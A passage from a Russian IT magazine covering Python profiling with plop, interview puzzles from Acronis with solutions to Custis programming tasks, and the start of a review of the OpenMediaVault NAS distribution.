две строчки кода. Здесь все как в старом анекдоте: «взял один доллар за то, что
забил гвоздь, и 99 долларов за то, что знал, куда его забить».

Установка plop’а

К сожалению, на момент написания статьи я не нашел публичных репозиториев
с DEB- и RPM-пакетом для plop’а. Это может быть аргументом против его ис-
пользования в продакшене, но он отлично работает в virtualenv, и всегда можно
найти компромисс с администратором и/или devops-инженером, ответствен-
ным за установку ПО на сервер.



ПРОФИЛИРОВАНИЕ VS ТЕСТИРОВАНИЕ
ПРОИЗВОДИТЕЛЬНОСТИ
Итак, как нам найти узкие места в нашем софте? Существуют всего два спо-
соба (вариант «пользователи не жалуются — значит, все хорошо» я не беру
в расчет): performance-тестирование и профилирование (англ. profiling).
Тестировать производительность можно, например, с целью проверить, что
твое приложение будет работать под определенной нагрузкой, или понять, на-
сколько быстрее новая версия по сравнению с предыдущей.
   К сожалению, перформанс-тестирование не всегда дает нужные результа-
ты. Как правило, тестирование производительности выполняется до момента
запуска ПО в продакшен. А это значит, что оно основывается (или как минимум
должно основываться) на нефункциональных требованиях к разрабатываемому
софту. Но мир далек от совершенства, и часто после релиза твою программу/
сервис/веб-приложение начинают использовать не так, как ты этого ожидал.
Правило Парето еще никто не отменял, и если ты оптимизировал не те 20%
своего кода, то тебе придется начинать все по новой. Но теперь уже с учетом
того, что будут делать пользователи.
  В отличие от перформанс-тестов, цель профилирования — собрать харак-
теристики работы программы для дальнейшей оптимизации.
   Как видишь, цели разнятся достаточно сильно. Но это и неудивительно —
для каждой задачи должен быть свой инструмент, и швейцарский нож не всегда
подходит.
   Профилирование интересно еще и тем, что его часто, хотя и не всегда (за-
висит от типа конкретного профайлера), можно применять прямо на боевом
сервере, так как профайлеры практически не влияют на производительность —
потерять 1–2% производительности сервера не так страшно, как проиметь
>50–70% ресурсов на перформанс-тесты. Тем более что такие компании,
как Dropbox, успешно это делают. Из плюсов такого подхода можно отметить
следующее:
•  профилирование будет работать именно в том окру-
   жении, которым будут пользоваться клиенты и/или
   юзеры, — нет проблемы «у меня оно и так быстро ра-
   ботает»;
•  тебе не нужно придумывать сценарии тестирования
   производительности — пользователи сами это сде-     WWW
   лают, поэтому тебе сразу станет понятно, какие 20%                                                                                                  Profiling на Wikipedia:
   своего кода нужно исправить сейчас, а какие можно                                                                                    goo.gl/CMCPlj
   отложить.
                                                                           Статья о профилировании
                                                                              на сайте Х:
Оговорюсь сразу, что на производительность ПО влияет                                                                            goo.gl/98DFOM
уж очень много факторов, поэтому полагаться исключи-
тельно на цифры не стоит. Я рекомендую все же вычис-              cProfile:
                                                                                      goo.gl/iAPU7xлять какие-то средние значения — так будет более объ-
ективно. Иначе разброс цифр получится очень большой.
   Например, на производительность веб-приложения могут влиять как неоп-
тимальный запрос к БД, так и настройки кеширования в файловой системе.
И это если отбросить то, что даже на одинаковых на первый взгляд серверах
скорость работы HDD/SSD/RAM может отличаться. Да, это будут какие-то мил-
лисекунды, но в масштабах десятка тысяч посетителей в день/час/минуту это
может оказаться более чем существенно. Я уже не говорю про настройку СУБД,
веб-серверов, сети и прочее — это потянет на отдельную статью.
   Итак, вернемся к нашей проблеме — профилированию Python-приложе-
ний в production. В качестве профилировщика я выбрал plop — простой и эф-
фективный статистический профайлер от одного из авторов Tornado, который
использует у себя в продакшене Dropbox. Профайлер настолько прост и уни-
версален, что можно работать практически с любой программой, написанной
на Python. Особо хочется отметить, что у него нет зависимостей — а это силь-
но расширяет возможности по его использованию. Да, в репозитории проек-
та есть requirements.txt с одной лишь строчкой — tornado, но это нужно только
для того, чтобы просматривать отчет.

ОСОБЕННОСТИ РАБОТЫ СТАТИСТИЧЕСКОГО ПРОФАЙЛЕРА
Принцип работы любого статистического профайлера, в том числе и plop’а, вы-
глядит примерно так.
   Раз в N-й отрезок времени профайлер смотрит, какая функция программы
работает в данный момент, и записывает эту информацию. В идеале информа-
цию профайлер должен собирать как можно дольше, иначе данные будут очень
неточными. Также статистические профайлеры могут не успевать логировать
данные в функциях, которые не работают значительно быстрее N; для этого
следует собирать данные о работе программы как можно дольше и, при воз-
можности, выполнять одно и то же действие несколько раз. Таким образом,
статистический профайлер может показать не всю информацию о работе ис-
следуемой программы, но проблемные места он обязательно выявит.
   Продукт еще сыроват, но автор достаточно быстро принимает патчи с по-
мощью pull-request’ов на GitHub. Я бы сказал, что plop прекрасно справляется
со своей первоначальной задачей — сбором метрики, а вот над обработкой
данных нужно еще поработать — в итоговом отчете очень много лишней ин-
формации. Таким образом, мы не только получаем отчет о своей программе,
но и видим, что и сколько раз вызывается во всех библиотеках, которые ис-
пользуются. Но plop может генерировать данные в JSON, а как его обрабаты-
вать — это уже задача не профайлера. Некоторые могут назвать недостатком
то, что у plop’а нет документации. Но для читателей Х это не должно быть про-
блемой: во-первых, там есть минимально необходимая документация по ис-
пользованию и запуску, а во-вторых, разобраться в нескольких сотнях строчек
кода не составит труда даже начинающему Python-программисту.

ПРИНЦИП РАБОТЫ PLOP’А
При дефолтных настройках plop работает следующим образом.
  На протяжении 30 с (duration) создается таймер, который каждые 10 мс оста-
навливает выполнение программы, записывает ее текущие stack trace с помо-
щью функции sys._current_frames() (https://goo.gl/FVXViG). Параметр duration
при запуске plop’а из командной строки по умолчанию будет равен не 30, а це-
лых 3600 с, то есть час! Разница в 120 раз может влиять на точность вычисле-
ния, нужно об этом помнить и быть осторожным. То, что профайлер работает
не всегда, а только в определенный отрезок времени, очень хорошо сказыва-
ется на производительности и позволяет использовать его в продакшене: на-
пример, на таком достаточно большом веб-приложении, как OpenStack Cinder
API, потеря скорости была всего overhead was 3.27297403843e-05 per sample
(0,00327297403843%).
   После работы профайлера можно сгенерировать HTML-страницу и посмо-
треть прямо в браузере красивый отчет, созданный с помощью библиотеки
D3.js.


Рис. 1. Plop
в действии





СИГНАЛЫ И ТАЙМЕРЫ
Вся работа plop’а построена на обработке сигналов по таймеру: грубо говоря,
каждые X миллисекунд приложение будет получать сигнал Y, по которому оно
остановится и запишет данные, необходимые для профайлинга.
   Всего в *nix-системах существует три типа таймеров (man setitimer), кото-
рые нам доступны. Управляются они следующими сигналами:
•  signal.ITIMER_REAL — уменьшает таймер реального времени;
•  signal.ITIMER_VIRTUAL — уменьшает интервальный таймер только тогда,
   когда выполняется наш процесс;
•  signal.ITIMER_PROF — то же самое, что и предыдущий, только считается
   и системное время.

В plop’е по умолчанию используется virtual mode, это означает, что вычисляется
только время исполнения питоновского кода. Этот параметр устанавливается
или параметром --mode (при запуске из командной строки), или соответствую-
щим аргументом mode в конструкторе класса Collector.

ЗАПУСК!
Есть два способа запустить профайлер. Первый способ более общий и позво-
ляет запустить профайлер с любой программой, написанной на Python’е, а вто-
рой требует небольшого изменения кода. Рассмотрим оба подробнее.

Запускаем plop без модификации исходников
Тут все очень просто. Мы запускаем на выполнение модуль
plop.collector и в качестве аргументов указываем нашу про-
грамму:

python -m plop.collector <имя нашей программы>             INFO

                                                                                   Plop также умеет
Все. Теперь после завершения программы будет сгенери-     строить Flamegraph,
рован файл с данными профайлера. По умолчанию он на-        но на момент
                                                                           написания статьизывается /tmp/plop.out. Также plop напишет, сколько вре-                                                                             генерация такого
мени потратилось на профайлер.                                                                         графика не работала.

Продвинутый способ запустить профайлер
В предыдущем способе запуска есть один недостаток — профайлер будет ра-
ботать всегда. Пусть он и не сильно влияет на производительность, но на очень
загруженной системе, когда каждая миллисекунда на счету, это может быть
ключевым доводом против использования профайлера. Решить эту пробле-
му можно, интегрировав plop в свой проект. Просто добавляем в зависимости
строку plop, а далее в коде мы уже сами можем выбирать, когда и как включать
и выключать профайлер. Разберем такой вариант подробнее.
   Этот способ удобен тем, что его можно включать и выключать в процессе
работы приложения без даунтайма, — достаточно всего лишь реализовать нуж-
ные REST API. Хотя есть и более удобный способ: так как профайлер, как прави-
ло, запускает кто-либо с админскими правами, то нам не надо давать для этого
REST API, пусть даже только админу, — нужно только реализовать поддержку
сигнала SIGHUP и менять значение в конфиге. При получении сигнала SIGHUP
приложения, как правило, перечитывают свои конфиги без перезагрузки. Этот
способ будет работать только при условии, что есть доступ к консоли сервера,
на котором крутится наше приложение.
   Вся «магия» профайлера собрана в классе Collector (https://goo.gl/AGI0wh).
Как несложно догадаться, для запуска профайлера нам надо вызвать метод
start и, соответственно, метод stop для остановки. Поэтому вам необходимо
всего лишь создать экземпляр класса Collector и в нужное время включить
и/или выключить его. После чего сохранить собранные данные в специально
отведенном для этого месте — и можно смотреть на результаты профайлера.

В МИРЕ КРУГОВ
Итак, с конфигурацией и запуском мы разобрались, осталось разобраться,
как работать с данными профайлера. И если в результатах работы профайлера
простого приложения все легко и понятно, то стоит только подключить его к че-
му-нибудь, содержащему что-то вроде Flask или Django... В общем, сначала
выдача кажется грандиозной, но потом ты внезапно осознаешь, что ничего
в ней не понимаешь.
   Plop строит дерево вызовов всех функций,
включая импортирование модулей. Размер
кругов показывает, как много времени было
потрачено на функцию, а чем толще стрелка,
тем чаще ее вызывали. Стоит отметить, что
на графике самый большой круг и, соответ-
ственно, самое большое время будет зани-
мать сам профайлер, но на практике это чис-
ло очень маленькое.
   Визуализация очень хорошо показывает,
сколько (не)нужных импортов у нас выполня-
                                                                        Рис. 2. Графикется при работе программы (см. рис. 2). Очень                                                                 импортирования
много данных будет поступать от использо-                    модулей
ванных фреймворков (SQLAlchemy, Django
и так далее), поэтому имеет смысл с помо-
щью plop viewer’а получить нужные данные
в формате JSON и обработать их, удалив за-
писи о профайлинге, например SQLAchemy.
Делается это так:

var nodes=[];
for (var i=0; i<data.nodes.length; i++)
{
    if (data.nodes[i].id[0].
    indexOf('cinder') > 0){
        nodes.push(data.nodes[i]);
    }
}

Такой нехитрый JavaScript покажет нам исключительно данные по нужным нам
файлам, но при этом ломает дерево вызовов (рис. 3).



Рис. 3. График
времени
работы





В случае же нехватки данных мы не увидим разницу в выполнении методов
и функций на диаграмме (рис. 4).


Рис. 4. Профайлер считает,
что все функции работают
одинаково





ПОДВОДЯ ИТОГИ
Если говорить кратко, то профилирование приложений с использованием ста-
тистического профайлера дает не слишком детальную картину происходяще-
го, но практически не влияет на производительность. Смотреть на результаты
такого профайлера нужно внимательно, и будь готов к тому, что результаты мо-
гут оказаться неточными, а для их сбора может понадобиться немало времени.
У каждого инструмента есть свои плюсы и минусы и, самое главное, сфера при-
менения. Поэтому выбирай инструмент, который подходит конкретно для по-
ставленной задачи. Хорошего профайлинга и быстрого софта!
Кодинг





                                       Александр Лозовский
                                                        lozovsky@glc.ru
  ЗАДАЧИ
     НА СОБЕСЕДОВАНИЯХ


     ЗАДАЧИ ОТ КОМПАНИИ ACRONIS
      И РЕШЕНИЯ ЗАДАЧ ОТ CUSTIS





«За что бьют сисопа? За отсутствие бэкапа!» Кор-
ни этой мудрости потерялись в веках, а само слово
«сисоп» уже подзабылось, но за отсутствие бэкапа
по-прежнему кого-то бьют. Слабые тела админов и
простых пользователей защищает не так уж много
производителей ПО, и из них, пожалуй, лидирующим
можно назвать Acronis — трудно найти в нашей стра-
не пользователя, данные которого ни разу не были бы
спасены программами Acronis от грандиозного фака-
па. Про админов и говорить нечего — решения этой
компании всегда занимали достойное место на за-
грузочных дисках для оказания первой помощи. А как
быть программистам, которые хотели бы в нее тру-
доустроиться? Когда-то я сам шарил по сайтам с ва-
кансиями и, как сейчас помню, был вдохновлен зар-
платой, которую в Acronis обещали программистам на
приплюснутом си.

Сегодня мы поговорим с Евгением Панищевым, руководителем QA Cloud на-
правления международной компании Acronis. Его отдел занимается тестирова-
нием всех облачных решений Acronis: от Backup as a Service до Disaster Recovery
as a Service. Задача лично Евгения — следить за тем, чтобы специалисты отде-
ла выполняли свою работу еще лучше и эффективнее.
   Евгений регулярно проводит собеседования при приеме людей в отдел со-
провождения качества и считает, что хороший тестировщик должен обладать
логическим мышлением, быть очень внимательным, уметь нестандартно мыс-
лить и четко обосновывать свою точку зрения. Поскольку нет такого человека,
который отрицал бы в себе наличие всех этих качеств :), для их проверки он
дает на собеседовании ряд задач — как имеющих правильный ответ, так и «от-
крытых», без единого решения.
  Свой выбор задач Евгений объясняет так: «Первый тип задач позволяет
проверить логические и аналитические способности кандидата, второй — по-
нять, как именно он мыслит. На собеседовании важно и то и другое; иногда
правильное живое мышление важнее верного ответа. Я знаю, что многие пре-
небрежительно относятся к задачам, предлагаемым на собеседовании, считая
их пустой тратой времени, но это ошибка. Такие тесты позволяют за довольно
короткое время понять, что за человек перед вами. Чем нестандартнее задачи,
тем лучше понимание».

ПРИМЕР 1
Любимое задание Евгения — тестирование калькулятора: кандидату выдают
обыкновенный настольный калькулятор и предлагают проверить его работу.
Эта задача не имеет точного решения, зато позволяет выявить уровень чело-
века как тестировщика. По тому, какие тест-кейсы он озвучивает, какие уточня-
ющие вопросы задает, как выбирает ключевые параметры тестирования при
наличии ограниченного числа тест-кейсов, можно понять, насколько человек
разбирается в теме, готов ли учиться и воспринимать подсказки, умеет ли идти
на компромисс и отстаивать свою точку зрения.



    Если это задание кажется тебе слишком простым, попробуй отве-
     тить на вопрос: как именно должен вести себя калькулятор, если
    произвести на нем действие, результат которого выйдет за пределы
    разрешенного для экрана количества цифр? Почему ты считаешь,
     что он должен вести себя именно так?



   «Для любого айтишника важно знание алгоритмов, оценка их сложности
и умение с ними работать, — говорит Евгений. — Без приличного математи-
ческого аппарата невозможно стать высококлассным специалистом: чем выше
вы подниметесь в иерархии программистов, тем с более высоким уровнем аб-
стракции вам придется иметь дело. Это практически не зависит от того направ-
ления, которое вы выберете: математика нужна везде».

ПРИМЕР 2
Чтобы проверить, как кандидат ориентируется в высоких алгебраических сфе-
рах, Евгений использует, например, такую задачу: «Дан массив S из n действи-
тельных чисел, а также число x. Как за время O(nlogn) определить, можно ли
представить х в виде суммы двух элементов из S?»
  В целом, по мнению Евгения, теория алгоритмов — это область, которой
часто пренебрегают в ходе обучения программированию. «Обычно ограничи-
ваются некоторыми общими словами и примерами. Знание сортировки „пу-
зырьком“ или быстрой сортировки само по себе недостаточно для понимания
темы. Кроме теории алгоритмов, необходима логика, а также умение ее при-
менять — желательно всегда и везде».
   Чтобы понять, умеет ли кандидат делать правильные умозаключения неза-
висимо от внешней формулировки, в Acronis используют следующую забавную
задачу:

ПРИМЕР 3
«Если лягушонок зеленый, то он веселый. Если лягушонок не веселый, то он си-
дит на берегу. Все лягушата либо зеленые, либо пестренькие. Если лягушонок
пестренький, то он плавает в воде.
  Из этого следует (нужно выбрать правильный ответ или ответы):
•  (A) все лягушата — пестренькие;
•  (B) все лягушата плавают в воде;
•  (C) все лягушата — веселые;
•  (D) все лягушата — не веселые;
•  (E) все веселые лягушата — зеленые».

«Задача выглядит детской и несерьезной, что зачастую сбивает многих кан-
дидатов с толку: они не могут абстрагироваться от формулировки и работать
с утверждениями так, будто это обычные логические последовательности. По
сути, это действительно довольно простая задачка, которая дается на матема-
тических олимпиадах школьникам пятых-шестых классов. Но об этом я канди-
датам не говорю; особенно тем, кто не смог ее решить» (задачка очень попу-
лярная, и, кстати, она была в одном из выпусков нашей рубрики. — Прим. ред.).
   Развитое логическое мышление иногда ценится даже выше, чем умение пи-
сать код. «На мой взгляд, логика нужна любому человеку, а IT-специалисту —
тем более. Поэтому мы, к сожалению, периодически вынуждены отказывать
кандидатам, которые пишут неплохой код, имеют немалый опыт, но при этом
очень слабо владеют математической логикой. Программист, который ею не
владеет, — это потенциальная угроза будущему продукту».
  Еще одна классическая задача на логику от Acronis:

ПРИМЕР 4
Предположим, что фраза «Завтра будет лучше, чем вчера» верна каждый день.
Какое из утверждений может тогда быть неверным?
•  (A) Послезавтра будет лучше, чем сегодня.
•  (B) Сегодня будет лучше, чем позавчера.
•  (C) Послезавтра будет лучше, чем позавчера.
•  (D) Завтра будет лучше, чем позавчера.
•  (E) В 2006 году 1 апреля будет лучше, чем позавчера.

Ну и конечно, для IT-специалиста важно умение писать код и разбираться в том,
что написали другие. По мнению Евгения, то и другое одинаково необходимо.
«Если человек умеет писать код, но совершенно не способен понять код колле-
ги, то он бесполезен, — точно так же, как тот, кто прекрасно читает чужой код,
но не может написать ни строчки своего».
   Чтобы понять, насколько свободно человек владеет кодом, в Acronis исполь-
зуют задачи наподобие этих:

ПРИМЕР 5
Объясните, что делает этот код:

((n & (n - 1) ) == 0)

ПРИМЕР 6
Найдите ошибку в следующем коде:

unsigned int i;
for (i = 100; i >= 0; --i)
  printf("%d\n", i);

ПРИМЕР 7
Дан текстовый файл размером 32 Гбайт. На тестовой машине установлены
Windows и питон. Нужно найти последнее вхождение слова ERROR и вывести
десять строчек до и десять после. Как изменится решение, если исходный файл
разбит на куски размером 2 Гбайт?
   Наконец, есть еще один неочевидный параметр, по которому обычно оце-
нивают кандидата. «Его называют по-разному, но мне больше нравится тер-
мин „толковость“. Это некая смесь „соображалки“, умения находить нестан-
дартный подход и вообще работать с новыми и необычными задачами. Задачи
для проверки этого качества вызывают самые большие споры. Практически
все уже знают вопросы о том, почему крышка у канализационного люка кру-
глая и сколько шариков может поместиться в автобусе. Такие вопросы можно
считать дурацкими, но их нужно задавать, чтобы понять, как человек способен
справиться с нестандартной ситуацией. Решения может не быть: это в данном
случае не главное».

ПРИМЕР 8
В Москве есть служба промышленных альпинистов, которые приводят в поря-
док внешнюю часть зданий и моют окна с наружной стороны. Оцените, сколько
таких альпинистов работает в Москве.
   Никто не ждет, что кандидат с ходу назовет точное число или хотя бы сможет
приблизительно его подсчитать. Главное — посмотреть, как человек мыслит,
как подходит к задаче, как пытается найти ответ.
  Но разумеется, есть и задачи с конкретным решением. Две из них Евгений
предлагает вниманию читателей «Хакера». Те, кто первыми пришлют правиль-
ные ответы (обязательно с обоснованием), получат в качестве приза от компа-
нии Acronis ключи от кварти... нет, стоп, не то письмо. Победитель получит ключ
для Acronis True Image 2015 — уникального ПО для резервного копирования
в безлимитное облако на один год.

ЗАДАЧА 1
Представьте, что у вас есть обыкновенные часы. Они идут точно, без сбоев.
В этих часах меняют местами минутную и часовую стрелки. Сколько раз в сутки
такие часы будут показывать правильное время?

ЗАДАЧА 2
Нужно написать на листе бумаги число 10 000 и обвести его в круг, не отрывая
ручку от этого листа бумаги; при этом цифры не должны соединяться друг
с другом.

  КУДА СЛАТЬ ПРАВИЛЬНЫЕ ОТВЕТЫ?

    Правильные ответы принимает Диана Круглова, Diana.Kruglova@
     acronis.com. Спеши выиграть ключ для Acronis True Image 2015 —
    уникального ПО для резервного копирования в безлимитное облако
    на один год!

РЕШЕНИЕ ЗАДАЧ ОТ КОМПАНИИ CUSTIS


ЗАДАЧА ДЛЯ РАЗРАБОТЧИКОВ ORACLE
Разработчик баз данных в свой первый рабочий день в компании Custis об-
наружил, что в его проекте используется всего одна табличка с данными по
отгруженным товарам (Т). В ней собираются данные по дате отгрузки (d), иден-
тификационному номеру клиента (c) и количеству отгруженного товара (s). Раз-
работчик проверил и убедился, что никаких ключей в таблице нет и по одному
клиенту может быть сколько угодно фактов отгрузки в один день.
   Почувствовав облегчение от того, что не придется возиться со страшными
запросами, разработчик пошел на кухню выпить кофе и перекусить фрукта-
ми. После возвращения он с легким сердцем схватил первый же инцидент со
Scrum-доски и прочитал следующее: «Нужен отчет по ежедневным отгрузкам
товара по выбранному клиенту». Посоветовавшись с товарищами, он выяснил,
что отчеты принято оформлять в виде view (представления), то есть для реше-
ния проблемы нужно сделать такой view, чтобы запрос

select * from V where c = ?

возвращал отчет по указанному клиенту, причем в результате будут отражены
все дни текущего года. Аналитик проекта сказал, что пользователи не любят
пустых граф в отчетах, так что все отсутствующие отгрузки придется формиро-
вать как нулевые.
   Как вы думаете, какой view в результате получился у нашего разработчика?

Ответ (приведенное решение нестандартное и требует владения особой улич-
ной магией Oracle, но есть и другие варианты):

create view V as
select p.d, T.c, nvl(sum(T.s),0) s
from (
  select
     trunc(sysdate, 'Y')+level-1 d
     from dual
     connect by trunc(sysdate, 'Y')+level-1<trunc(sysdate+366, 'Y')
) p
left join T partition by (T.c) on T.d = p.d
group by p.d, T.c

ЗАДАЧА ДЛЯ РАЗРАБОТЧИКОВ C#
За день до релиза отдел тестирования обнаружил, что отчет об остатках товара
формируется около часа. Вам была поручена задача оптимизировать процесс
создания отчета. Профилировщик показал, что в коде

var atlasClient = new AtlasClient();
var allProducts = Session
    .Query<Product>()
    .Select(p => new
    {
        Product = p,
        Rests = atlasClient.GetRests(p.Id)
    });
var fewProducts = allProducts.Where(i => i.Rests > 0 && i.Rests <
  10).Select(i => i.Product);
var someProducts = allProducts.Where(i => i.Rests >= 10 && i.Rests <
  100).Select(i => i.Product);
var manyProducts = allProducts.Where(i => i.Rests >= 100).Select(i =>
  i.Product);
PrintFewProducts(fewProducts);
PrintSomeProducts(someProducts);
PrintManyProducts(manyProducts);

метод atlasClient.GetRests занимает около 98% общего времени построе-
ния отчета.
   Предложите вариант оптимизации построения отчета. Почему ваш вариант
работает быстрее? Сколько времени занимает построение отчета после ва-
шей оптимизации?

Ответ (один из вариантов):
•  Используя ToArray() или аналоги, вычислить последовательность allProducts
   до ее использования при получении fewProducts, someProducts, manyProducts.
•  AllProducts является отложенным Linq-запросом, и его использование в трех
   выражениях приводит к многократному вычислению элементов последова-
   тельности. Вычислив последовательность один раз, мы сэкономим два «до-
   рогих» вызова atlasClient.GetRests на каждый элемент последовательности,
   но нам потребуется дополнительный объем памяти для хранения резуль-
   тата. Из-за этого при больших объемах данных такое решение «в лоб» не
   всегда может быть применимо.
•  Такой вариант построения отчета будет занимать около двадцати минут.

ЗАДАЧА ДЛЯ РАЗРАБОТЧИКОВ JAVA
Разработчик C# решил попробовать себя на поприще Java и перешел
в Java-проект. Одно из первых заданий, которое он получил, — сделать табли-
цу с информацией о проданных товарах. В постановке задачи было написа-
но, что нужны следующие столбцы: имя клиента, код клиента, название товара
и стоимость товара. Посмотрев на реализацию такого рода таблиц в проекте,
он понял, что при настройке таблицы придется написать что-то вроде

table.add( "customer.name" );
table.add( "customer.code" );
table.add( "subject.name" );
table.add( "summ" );

Прямо скажем, по сравнению с тем, как он делал это на родном dotNet, это
выглядело совсем ненадежно — никаких проверок уровня компиляции, очень
легко допустить ошибку. Хочется написать

table.add( customer.name );

Или хотя бы

table.add( {} -> customer.name );

А тут такое... Код получается небезопасный, IDE никак не подсказывает, что пи-
сать, и вообще... Решив не сдаваться и привнести свет истины в захолустное
царство Java, он объяснил проблемы такой настройки таблиц другим Java-раз-
работчикам. Ему отвечали, что проект ведется на Java 7, лямбд нет, а с аноним-
ными классами для каждого поля настройка будет выглядеть жутко, поэтому
«пишем, как можем». Однако, найдя единомышленников в стане Java, он смог
реализовать движок, который позволял настраивать столбцы вот так:

Payment root = root( Payment.class );
table.add($( root.getCustomer().getName() ));
…

Причем интерфейс настройки таблиц менять не пришлось, то есть на вход table.
add приходит все та же строка customer.name. Не пришлось менять и модель-
ные сущности («покупатель», «товар», «покупка» и другие), и даже не понадоби-
лось никаких автогенерированных классов. Этот инструмент начали использо-
вать везде, где нужно было сослаться на цепочку свойств.
   Как бы вы реализовали такой фреймворк? Важен только принцип, код пи-
сать не нужно.

Ответ (описание подхода):
•  root — статический метод, на лету создающий особый прокси-объект вокруг
   модельной сущности. Все get-методы в этом объекте записывают свои вы-
   зовы в глобальную переменную (например, ThreadLocal);
•  $ — статический метод, который из данной глобальной переменной получа-
   ет полный путь к полю в виде строки.

   IT-КОМПАНИИ, ШЛИТЕ НАМ СВОИ ЗАДАЧКИ!

    Миссия этой мини-рубрики — образовательная, поэтому мы бес-
    платно публикуем качественные задачки, которые различные компа-
    нии предлагают соискателям. Вы шлете задачки на lozovsky@glc.ru —
   мы их публикуем. Никаких актов, договоров, экспертиз и отчетностей.
    Читателям — задачки, решателям — подарки, вам — респект от на-
    шей многосоттысячной аудитории, пиарщикам — строчки отчетности
    по публикациям в топовом компьютерном журнале.
Unixoid

Личная пещера
Али-Бабы



 Обзор программного NAS
 OpenMediaVault


                                                                        Роман Ярыженко
                                                                                           rommanio@yandex.ru




Если у тебя есть старый компьютер, который некуда
применить, — на его основе можно собрать NAS.
Существует немало различного софта для этой
цели, в частности несколько дистрибутивов, один
из которых, OpenMediaVault, мы и рассмотрим.





ВВЕДЕНИЕ
Дистрибутив основан на Debian и был создан в результате раскола в стане раз-
работчиков FreeNAS. Особенности:
•  многоязычность;
•  поддержка GPT и файловых систем ext4/XFS/JFS;
•  мониторинг — в том числе S.M.A.R.T и SNMP;
•  веб-интерфейс;
•  система плагинов, позволяющая подключать новые возможности, такие, на-
   пример, как LVM.

УСТАНОВКА И НАЧАЛЬНАЯ НАСТРОЙКА
Установку описывать смысла не имеет — разработчики не стали мудрить и в ка-
честве программы установки использовали таковую из Debian, несколько упро-
стив: так, этап разметки диска производится полностью автоматически, недо-
стающие же пакеты установщик будет скачивать с репозитория.
   После установки мне пришлось поправить /etc/network/interfaces: установ-
щик включает только один, а для тестирования необходимо было два. Также
по неизвестной причине стандартный пароль WebGUI принимать не желал,
пришлось ставить свой с помощью команды omv-firstaid, причем это удалось
сделать только после нескольких попыток.

                                                               Вход в веб-
                                                                интерфейс





После входа видим меню навигации слева и самую общую информацию — вер-
сию ядра, самого OpenMediaVault и информацию о текущей нагрузке. Сверху же
несколько вкладок. Помимо «Обзора», есть еще «Процессы» — вывод утилиты
top, «Статус» — различные графики за разные периоды (использование про-
цессора, сети, диска) и «Отчет» — выжимка информации о системе (список
интерфейсов, сокеты, таблица маршрутизации и так далее).





После входа

Имеет смысл сразу же обновить систему, для чего нужно зайти в «Менеджер
обновлений», выбрать все имеющиеся пакеты и нажать кнопку «Загрузить». По-
сле этого нужно выключить (или хотя бы увеличить) тайм-аут сессии, поскольку
пять минут выглядят для NAS слишком параноидально. Для отключения/увели-
чения нужно перейти в «Общие настройки» и установить «Закончилось время
сессии» в нужное значение.





Обновление системы





Настройка тайм-аута сессии

Следующий шаг — настройка хранилища. Для начала создадим массив RAID.
Удостоверимся, что диски присутствуют в системе, для чего перейдем в «Физи-
ческие диски». После этого заходим в «Менеджер RAID», нажимаем «Создать»,
выбираем жесткие диски и тип массива RAID, жмем «Сохранить» и ждем како-
е-то время. Затем создаем файловую систему: переходим в «Файловые систе-
мы», нажимаем «Создать», указываем устройство, метку тома и тип файловой
системы, жмем «ОК», монтируем и применяем. Наконец, создаем общий ката-
лог: переходим в «Общие каталоги -> Добавить», устанавливаем имя и права
доступа и вновь сохраняем.





Создание RAID. Главное окно





Создание RAID. Подготовка





Создание RAID. Синхронизация массива





Создание общего каталога

Теперь можно настраивать нужные сервисы. Начнем с Самбы (SMB/CIFS).
На вкладке «Настройки» ставим «Включить», устанавливаем имя рабочей груп-
пы, остальные опции по вкусу. Сохраняем и смотрим вкладку «Сетевые ресур-
сы». По дефолту там пусто. После нажатия кнопки «Создать» появится окно, где
можно добавить общий ресурс. Рассмотрим несколько параметров, которые
там настраиваются:
•  «Опубликован» — кто именно может просматривать ресурс. Если выбрано
   «Разрешено гости», то, в случае неуказания пароля, пользователя пустит как
   гостя. В случае же выбора «Только гости» пускает без пароля вообще.
•  «Наследование списков ACL» — если имеются списки ACL у родительского
   каталога, они будут применяться к создаваемым файлам и каталогам.
•  «Расширенные атрибуты» и «Хранить DOS-атрибуты» — хранить ли атри-
   буты OS/5 (первое) и как хранить атрибуты DOS («Скрытый», «Системный»
   и «Только для чтения»), в виде расширенных атрибутов или же отобразить их
   на стандартные права доступа.





Создание общего ресурса SMB

Все остальные сервисы настраиваются схожим образом.

FreeNAS

FreeNAS основан на FreeBSD 9-й ветки и предоставляет
следующие возможности:                                                          INFO

• снапшоты и репликацию — благодаря ZFS;                     OpenMediaVault
• RAID-Z — технологию, аналогичную обычному RAID, но        основан на Debian 7
                                                                                  с ядром 3.2.0-4.  без архитектурных недочетов последнего;
• шифрование томов — опять же благодаря ZFS.

Стоит отметить, что интенсивное использование ZFS тре-
бует много памяти, так что для старых компьютеров этот
вариант не подходит. Также есть коммерческая версия
FreeNAS — TrueNAS, помимо ПО, предоставляющая желе-



ОБЗОР ИНТЕРФЕЙСА
Интерфейс левой панели, как ты уже увидел, древовидный с одним уровнем
вложенности. Поглядим, что в данных ветвях есть. В «Общих настройках»
на вкладке «Web Администратор» можно указать, во‑первых, порт и время дей-
ствия сессии (что мы и сделали), во‑вторых — поддержку SSL/TLS. На вклад-
ке же «Пароль Web Администратора», понятно, устанавливается пароль для
входа в WebGUI.
   «Дата и время» содержит настройки часового пояса и NTP-клиента. Тут
что-либо комментировать нет надобности.
   «Сеть» содержит несколько вкладок. На вкладке «Общий» можно задать имя
хоста и домена. На вкладке «Интерфейсы» — настроить сетевые интерфейсы
(поддерживается как динамическое выделение адресов, так и статическая на-
стройка, а для эстетов можно задавать дополнительные параметры вручную).
На вкладке «DNS-сервер»… без комментариев. А вот следующую вкладку,
«Обозреватель сервисов» (в оригинале «Service Discovery»), стоило бы назвать
более понятным именем. Данная вкладка представляет собой в конечном сче-
те интерфейс к Avahi, который объявляет ресурсы, доступные на хосте (а никак
не обозревает). «Брандмауэр» предоставляет интерфейс к старому доброму
iptables. Для NAS, впрочем, подобная функциональность кажется избыточной.
   «Уведомление» — поддержка уведомлений. На вкладке «Настройки» указы-
вается, куда отправлять то или иное уведомление. К сожалению, можно указать
не более двух адресатов. На вкладке «Уведомления» настраивается собствен-
но список событий, о которых получатели будут извещены.
   «Управление энергопотреблением», вкладка «Настройки» — указывается,
что делать по нажатии кнопки питания и выбирать ли сопутствующий уровень
энергопотребления процессора, если последний это поддерживает. А вот
вкладка «Запланированные задания» лишь на первый взгляд аналогична ветви
«Запланированные задания». На деле же на ней можно запланировать выклю-
чение, засыпание (эта процедура переведена как «Остановка шпинделя») или
перезагрузку.
  В ветви «Сертификаты» можно управлять сертификатами — создавать, им-
портировать, редактировать и удалять. Создание сертификатов, должен отме-
